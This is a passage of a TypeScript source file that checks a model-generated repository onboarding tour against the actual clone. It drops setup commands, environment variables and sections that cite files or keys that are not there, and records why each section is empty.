 * points at something that is not there — a file, or a service inside it. AC-40
 * fixes five reasons and two sibling slices read those five keys.
 */
function groundSetupCommands(
  commands: OnboardingResponse['setup_commands'],
  ctx: OnboardingGroundingContext,
  dropped: OnboardingDropped,
): OnboardingSetupCommand[] {
  const kept: OnboardingSetupCommand[] = [];
  const seen = new Set<string>();

  for (const entry of commands) {
    const sourcePath = sanitizePath(entry.source_path);
    if (sourcePath === null || !ctx.verified.has(sourcePath)) {
      dropped.unknown_path += 1;
      continue;
    }
    const command = entry.command.trim();
    const parts = tokens(command);
    if (
      !withinCommandCap(command) ||
      !isSafeCommand(parts) ||
      !setupCommandIsAuthorised(parts, sourcePath, ctx)
    ) {
      dropped.unknown_path += 1;
      continue;
    }
    const normalised = parts.join(' ');
    if (seen.has(normalised)) continue;
    seen.add(normalised);
    kept.push({ command: normalised, why: line(entry.why), source_path: sourcePath });
  }
  return kept.slice(0, MAX_SETUP_COMMANDS);
}

/** Whether a config file DECLARES a key, rather than merely mentioning it. */
function declaresEnvKey(text: string, name: string): boolean {
  // `name` has already matched ENV_NAME, so it carries no regex metacharacter —
  // this cannot become a pattern the model wrote. A commented-out key counts:
  // `# DATABASE_URL=` in an `.env.example` is exactly a variable to fill in.
  return new RegExp(`^[ \\t]*(?:#[ \\t]*)?(?:export[ \\t]+)?${name}[ \\t]*=`, 'm').test(text);
}

interface GroundedEnv {
  vars: OnboardingEnvVar[];
  truncated: boolean;
}

/**
 * A variable survives only when the file it cites really declares it (AC-21).
 *
 * `env_vars_truncated` is set HERE and nowhere else. A `false` looks exactly like
 * a complete list to every consumer, so a run that forgot to set it would be
 * indistinguishable from one with nothing to cut — and this repository's own
 * `server/.env.example` declares thirteen keys against a ceiling of twelve, so
 * the demo repository reaches the cut on its first generation.
 */
function groundEnvVars(
  entries: OnboardingResponse['env_vars'],
  ctx: OnboardingGroundingContext,
  extra: OnboardingGroundingExtras,
): GroundedEnv {
  const sources = new Map(ctx.envSources.map((file) => [file.path, file.text]));
  const kept: OnboardingEnvVar[] = [];
  const seen = new Set<string>();

  for (const entry of entries) {
    if (!ENV_NAME.test(entry.name)) {
      extra.unknown_env += 1;
      continue;
    }
    const sourcePath = sanitizePath(entry.source_path);
    const text = sourcePath === null ? undefined : sources.get(sourcePath);
    if (sourcePath === null || text === undefined || !declaresEnvKey(text, entry.name)) {
      extra.unknown_env += 1;
      continue;
    }
    if (seen.has(entry.name)) continue;
    seen.add(entry.name);
    kept.push({ name: entry.name, source_path: sourcePath });
  }

  return { vars: kept.slice(0, MAX_ENV_VARS), truncated: kept.length > MAX_ENV_VARS };
}

/* --------------------------------------------------------- the five sections */

/**
 * What a section shows besides its prose. A section with a body and nothing in
 * its list is still empty: the list IS the section on four of the five cards.
 */
interface SectionPayloads {
  flows: OnboardingFlow[];
  reading: OnboardingReadingStep[];
  tasks: OnboardingTask[];
  packages: OnboardingPackageBlock[];
  setup: OnboardingSetupCommand[];
}

function payloadIsEmpty(kind: OnboardingSectionKind, payloads: SectionPayloads): boolean {
  switch (kind) {
    case 'architecture':
      return false;
    case 'critical_paths':
      return payloads.flows.length === 0;
    case 'how_to_run':
      return payloads.packages.length === 0 && payloads.setup.length === 0;
    case 'reading_path':
      return payloads.reading.length === 0;
    case 'first_tasks':
      return payloads.tasks.length === 0;
  }
}

/**
 * Why an empty section is empty, preferring the INPUT over the model.
 *
 * "No import graph" is a fact about the repository and "the model returned
 * nothing" is a fact about the generation; only one of them is worth pressing the
 * button again over, so the reason names the input whenever the input was the
 * thing that was missing.
 */
function emptyReason(
  kind: OnboardingSectionKind,
  ctx: OnboardingGroundingContext,
  payloads: SectionPayloads,
): OnboardingEmptyReason {
  switch (kind) {
    case 'architecture':
      return 'model_returned_nothing';
    case 'critical_paths':
      return ctx.chains.length === 0 ? 'no_import_graph' : 'model_returned_nothing';
    case 'how_to_run':
      return ctx.packages.length === 0 ? 'no_packages' : 'model_returned_nothing';
    case 'reading_path':
      return payloads.reading.length === 0 ? 'no_ranked_files' : 'model_returned_nothing';
    case 'first_tasks':
      return payloads.tasks.length === 0 ? 'no_tasks' : 'model_returned_nothing';
  }
}

function buildSections(
  found: Map<OnboardingSectionKind, GroundedSection>,
  ctx: OnboardingGroundingContext,
  payloads: SectionPayloads,
): OnboardingSection[] {
  return OnboardingSectionKind.options.map((kind) => {
    const section = found.get(kind);
    const ready = section !== undefined && section.body !== '' && !payloadIsEmpty(kind, payloads);
    if (section !== undefined && ready) {
      return {
        kind,
        title: section.title,
        body: section.body,
        ...(section.diagram === undefined ? {} : { diagram: section.diagram }),
        links: section.links,
        verified_paths: section.verified_paths,
        state: 'ready' as const,
        empty_reason: null,
      };
    }
    // The place is kept, never collapsed: five sections come out of every
    // generation, in enum order, so a missing input costs a reason and not a
    // hole in the page.
    return {
      kind,
      title: section?.title ?? '',
      body: '',
      links: [],
      verified_paths: [],
      state: 'empty' as const,
      empty_reason: emptyReason(kind, ctx, payloads),
    };
  });
}

/**
 * The one entry point: an untrusted answer in, a tour that is true out.
 *
 * It is a single function on purpose. The invariant "nothing reaches the record
 * that the clone does not confirm" broke three times in three places on an
 * earlier feature because it was maintained per call site
 * (`server/INSIGHTS.md`, "An invariant maintained at the call site breaks once
 * per call site"), so there is one door and the suite drives one hostile response
 * through it.
 */
export function groundOnboarding(
  response: OnboardingResponse,
  ctx: OnboardingGroundingContext,
): GroundedOnboarding {
  const dropped: OnboardingDropped = {
    unknown_path: 0,
    unknown_script: 0,
    manager_mismatch: 0,
    unknown_complexity: 0,
    unknown_section: 0,
  };
  const extra: OnboardingGroundingExtras = { off_chain: 0, unknown_env: 0 };

  const flows = groundFlows(response.flows, ctx, dropped, extra);
  const reading = groundReading(response.reading_path, ctx, dropped, extra);
  const packages = groundRun(response.run, ctx, dropped);
  const setup = groundSetupCommands(response.setup_commands, ctx, dropped);
  // AFTER the two that produce commands, and that is the requirement rather
  // than the order this file happens to be written in: a task step may name
  // only a command "How to run" already grounded, so the set has to exist
  // before the tasks are read.
  const tasks = groundTasks(response.tasks, ctx, dropped, groundedCommands(packages, setup));
  const env = groundEnvVars(response.env_vars, ctx, extra);

  const payloads: SectionPayloads = { flows, reading, tasks, packages, setup };
  const sections = buildSections(groundSections(response.sections, ctx, dropped), ctx, payloads);

  return {
    tour: {
      sections,
      flows,
      reading_path: reading,
      tasks,
      setup_commands: setup,
      packages,
      env_vars: env.vars,
      env_vars_truncated: env.truncated,
    },
    dropped,
    extra,
  };
}
